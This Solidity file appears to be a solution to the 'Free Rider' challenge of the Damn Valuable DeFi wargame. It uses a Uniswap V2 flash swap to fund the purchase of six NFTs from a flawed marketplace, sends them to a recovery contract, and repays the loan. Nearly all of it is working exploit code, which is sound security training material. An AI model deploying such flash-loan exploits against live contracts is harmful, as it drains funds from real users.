// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FreeRiderNFTMarketplace.sol";
import "solmate/src/tokens/WETH.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "../DamnValuableNFT.sol";

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external;
}

interface IUniswapV2Pair {
    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;
}

contract FreeRiderHelper is IUniswapV2Callee, IERC721Receiver {
  IUniswapV2Pair public pair;
  WETH public weth;
  FreeRiderNFTMarketplace public nftMarketplace;
  DamnValuableNFT public nft;
  address public freeRiderRecovery;
  address public recipient;

  constructor(address _pair, address payable _weth, address payable _nftMarketplace, address _nft, address _freeRiderRecovery, address _recipient) {
    pair = IUniswapV2Pair(_pair);
    weth = WETH(_weth);
    nftMarketplace = FreeRiderNFTMarketplace(_nftMarketplace);
    nft = DamnValuableNFT(_nft);
    freeRiderRecovery = _freeRiderRecovery;
    recipient = _recipient;
  }

  receive() external payable {}

  function flashSwap(uint wethAmount) external {
      // Need to pass some data to trigger uniswapV2Call
      bytes memory data = abi.encode(address(weth), msg.sender);

      // amount0Out is WETH, amount1Out is DVT
      pair.swap(wethAmount, 0, address(this), data);
  }

  // This function is called by the WETH/DVT pair contract
  function uniswapV2Call(
      address sender,
      uint amount0,
      uint,
      bytes calldata data
  ) external {
      require(msg.sender == address(pair), "not pair");
      require(sender == address(this), "not sender");

      (address tokenBorrow, address caller) = abi.decode(data, (address, address));

      // Your custom code would go here. For example, code to arbitrage.
      require(tokenBorrow == address(weth), "token borrow != WETH");
      doStuff(amount0);

      // about 0.3% fee, +1 to round up
      uint256 fee = (amount0 * 3) / 997 + 1;
      uint256 amountToRepay = amount0 + fee;

      // Transfer flash swap fee from caller
      weth.transferFrom(caller, address(this), fee);

      // Repay the pool
      weth.transfer(address(pair), amountToRepay);
  }

  function doStuff(uint256 wethNeeded) private {
    weth.approve(address(weth), 15 ether);
    weth.withdraw(15 ether);
    uint256[] memory tokenIds = new uint256[](6);
    tokenIds[0] = 0;
    tokenIds[1] = 1;
    tokenIds[2] = 2;
    tokenIds[3] = 3;
    tokenIds[4] = 4;
    tokenIds[5] = 5;
    nftMarketplace.buyMany{value: 15 ether}(tokenIds);

    for (uint256 i; i < 6;) {
      nft.safeTransferFrom(address(this), freeRiderRecovery, i, abi.encode(recipient));

      unchecked {
        ++i;
      }
    }

    weth.deposit{value: wethNeeded}();
  }

  function onERC721Received(address, address, uint256, bytes memory)
        external
        pure
        override
        returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }
}